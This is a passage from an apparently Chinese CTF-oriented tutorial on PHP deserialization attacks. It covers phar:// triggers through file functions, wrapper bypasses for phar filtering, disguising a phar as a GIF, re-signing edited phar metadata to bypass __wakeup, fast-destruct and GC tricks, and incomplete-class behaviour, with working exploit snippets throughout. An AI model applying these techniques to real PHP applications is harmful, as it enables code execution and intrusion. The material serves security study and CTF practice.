</span></span><span style="display:flex;"><span><span style="color:#58a1dd">unlink</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">stat</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fstat</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">rename</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">opendir</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">rmdir</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mkdir</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">以及，基于文件操作的其他函数</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">file_put_contents</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">file_get_contents</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">file_exists</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fileinode</span>()
</span></span><span style="display:flex;"><span><span style="color:#ff636f">include</span>()
</span></span><span style="display:flex;"><span><span style="color:#ff636f">require</span>()
</span></span><span style="display:flex;"><span><span style="color:#ff636f">include_once</span>()
</span></span><span style="display:flex;"><span><span style="color:#ff636f">require_once</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filemtime</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fileowner</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fielperms</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">甚至看起来不行其实可以的函数，比如</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filesize</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">is_dir</span>()
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">scandir</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">更离谱的是这样也可以触发反序列化</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">class</span> <span style="color:#58a1dd">hack</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>(){
</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;hack class destruct&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">DirectoryIterator</span>(<span style="color:#a6be9d">&#34;phar://flag.phar&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">甚至</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">hack</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>(){
</span></span><span style="display:flex;"><span>       <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;hack class destruct&#34;</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#a6be9d">&#34;phar://flag.phar&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">这些还不是全部</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">https</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">blog</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">zsxsoft</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">com</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">post</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">38</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">https</span><span style="color:#ff636f">://</span><span style="color:#58a1dd">threezh1</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">com</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">2019</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">09</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">09</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">phar</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">F</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">D</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">BA</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">F</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">88</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">97</span><span style="color:#ff636f">%</span><span style="color:#58a1dd">E5</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">8</span><span style="color:#58a1dd">C</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">96</span><span style="color:#ff636f">/</span></span></span></code></pre></div><h3 id="用法" class="heading-element"><span>用法</span>
  <a href="#%e7%94%a8%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>上传phar文件的时候可以把后缀改成gif之类</li>
<li>调用我们上传的phar文件的功能点文件前面加上phar://</li>
</ul>
<h2 id="bypass" class="heading-element"><span>bypass</span>
  <a href="#bypass" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>（1）phar://被过滤
有以下几种方法可以绕过：</p>
<ul>
<li>compress.bzip2://phar://</li>
<li>compress.zlib://phar:///</li>
<li>php://filter/resource=phar://</li>
<li>$z = &lsquo;compress.bzip2://phar:///home/sx/test.phar/test.txt&rsquo;;</li>
</ul>
<p>（2）除此之外，我们还可以将phar伪造成其他格式的文件。
php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$user</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">User</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$phar</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Phar</span>(<span style="color:#a6be9d">&#34;shell.phar&#34;</span>); <span style="color:#828b96;font-style:italic">//生成一个phar文件，文件名为shell.phar
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">startBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setStub</span>(<span style="color:#a6be9d">&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;</span>); <span style="color:#828b96;font-style:italic">//设置stub
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setMetadata</span>(<span style="color:#58a1dd">$user</span>); <span style="color:#828b96;font-style:italic">//将对象user写入到metadata中
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">addFromString</span>(<span style="color:#a6be9d">&#34;shell.txt&#34;</span>,<span style="color:#a6be9d">&#34;haha&#34;</span>); <span style="color:#828b96;font-style:italic">//添加压缩文件，文件名字为shell.txt,内容为haha
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">stopBuffering</span>();</span></span></code></pre></div><h2 id="010" class="heading-element"><span>010</span>
  <a href="#010" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>有时phar文件需要修改数据，可以用010修改，比如这里修改对象数量绕过wakeup</p>
<ul>
<li>原本是序列化对象属性个数是3，这里改成4</li>
<li>
<!-- raw HTML omitted -->
</li>
</ul>
<p>由于我们修改了phar中的metadata数据，因此签名也需要重新计算：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">hashlib</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">sha1</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">f</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;./test.gif&#39;</span>, <span style="color:#a6be9d">&#39;rb&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>() <span style="color:#828b96;font-style:italic"># 修改内容后的phar文件</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">f</span>[:<span style="color:#ff636f">-</span><span style="color:#a6be9d">28</span>] <span style="color:#828b96;font-style:italic"># 获取要签名的数据</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">s</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">h</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">f</span>[<span style="color:#ff636f">-</span><span style="color:#a6be9d">8</span>:] <span style="color:#828b96;font-style:italic"># 获取签名类型以及GBMB标识</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">h</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">newf</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">sha1</span>(<span style="color:#58a1dd">s</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">digest</span>()<span style="color:#ff636f">+</span><span style="color:#58a1dd">h</span> <span style="color:#828b96;font-style:italic"># 数据 + 签名 + 类型 + GBMB</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;datou.gif&#39;</span>, <span style="color:#a6be9d">&#39;wb&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">write</span>(<span style="color:#58a1dd">newf</span>) <span style="color:#828b96;font-style:italic"># 写入新文件</span></span></span></code></pre></div><p>用上方脚本计算完成后，在当前目录会生成datou.gif文件</p>
<h1 id="提前destruct" class="heading-element"><span>提前destruct</span>
  <a href="#%e6%8f%90%e5%89%8ddestruct" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="垃圾回收gc" class="heading-element"><span>垃圾回收GC</span>
  <a href="#%e5%9e%83%e5%9c%be%e5%9b%9e%e6%94%b6gc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>__destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行</p>
<p>显式销毁，当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL
隐式销毁，PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉</p>
<p>这里在CTF中的应用就是比如throw new Exception会中断destruct，需要强制进行垃圾回收触发__destruct</p>
<p>核心思想：反序列化一个数组，然后再利用第一个索引，来触发GC</p>
<p>简单来说，就是：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#ff636f">array</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">B</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span>[<span style="color:#a6be9d">1</span>]<span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">B</span>();
</span></span><span style="display:flex;"><span><span style="color:#ff636f">.....</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$a</span>);</span></span></code></pre></div><p>EXP:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">B</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;mung&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#ff636f">array</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">B</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">B</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//a:2:{i:0;O:1:&#34;B&#34;:0:{}i:1;O:1:&#34;B&#34;:0:{}}
</span></span></span></code></pre></div><p>这样就能成功执行魔术方法了。</p>
<p>EXP：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">B</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$p</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">A</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">A</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$a</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Fun</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Fun</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$func</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;call_user_func_array&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">func</span> <span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Test::getFlag&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">B</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">B</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$c</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">urlencode</span>(<span style="color:#58a1dd">$a</span>);</span></span></code></pre></div><p>一样的原理，也是通过添加第一个索引达到触发GC的效果。</p>
<p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”，漏洞报告如下（CVE-2016-5771）： <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771"target="_blank" rel="external nofollow noopener noreferrer">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771</a></p>
<h2 id="fast-destruct-1" class="heading-element"><span>fast-destruct</span>
  <a href="#fast-destruct-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
<p>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
<ul>
<li>一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发<code>__destruct</code></li>
</ul>
<pre tabindex="0"><code>$a = new a();
$arry = array($a,&#34;1234&#34;);
$result = serialize($arry);echo $result.&#34;&lt;br&gt;&#34;;
//a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:1;s:4:&#34;1234&#34;;}   这是正常的
//a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:0;s:4:&#34;1234&#34;;}   #修改序列化数字元素个数
//a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:1;s:4:&#34;1234&#34;;    #去掉序列化尾部 }</code></pre><p>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p>
<h1 id="不存在的类" class="heading-element"><span>不存在的类</span>
  <a href="#%e4%b8%8d%e5%ad%98%e5%9c%a8%e7%9a%84%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p>漏洞点在于==序列化==的时候__PHP_Incomplete_Class_Name如果为空，即找不到绑定的类，那么__PHP_Incomplete_Class类中的属性也会被丢弃</p>
</blockquote>
<p>正常来说一个合法的反序列化字符串，在二次序列化也即反序列化再序列化之后所得到的结果是一致的。</p>
<p>比如</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$raw</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;O:1:&#34;A&#34;:1:{s:1:&#34;a&#34;;s:1:&#34;b&#34;;}&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$raw</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//O:1:&#34;A&#34;:1:{s:1:&#34;a&#34;;s:1:&#34;b&#34;;}
</span></span></span></code></pre></div><p>可以看到即使脚本中没有A这个类，在反序列化序列化过后得到的值依然为原来的值。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$raw</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;O:1:&#34;A&#34;:1:{s:1:&#34;a&#34;;s:1:&#34;b&#34;;}&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$raw</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*Output:
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">object(__PHP_Incomplete_Class)#1 (2) {
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">  [&#34;__PHP_Incomplete_Class_Name&#34;]=&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">  string(1) &#34;A&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">  [&#34;a&#34;]=&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">  string(1) &#34;b&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">}*/</span></span></span></code></pre></div><p>可以发现PHP在遇到不存在的类时，会把不存在的类转换成<code>__PHP_Incomplete_Class</code>这种特殊的类，同时将原始的类名<code>A</code>存放在<code>__PHP_Incomplete_Class_Name</code>这个属性中，其余属性存放方式不变。而我们在序列化这个对象的时候，serialize遇到<code>__PHP_Incomplete_Class</code>这个特殊类会倒推回来，序列化成<code>__PHP_Incomplete_Class_Name</code>值为类名的类，我们看到的序列化结果不是<code>O:22:&quot;__PHP_Incomplete_Class_Name&quot;:2:{xxx}</code>而是<code>O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:1:&quot;b&quot;;}</code>,那么如果我们自己如下构造序列化字符串</p>
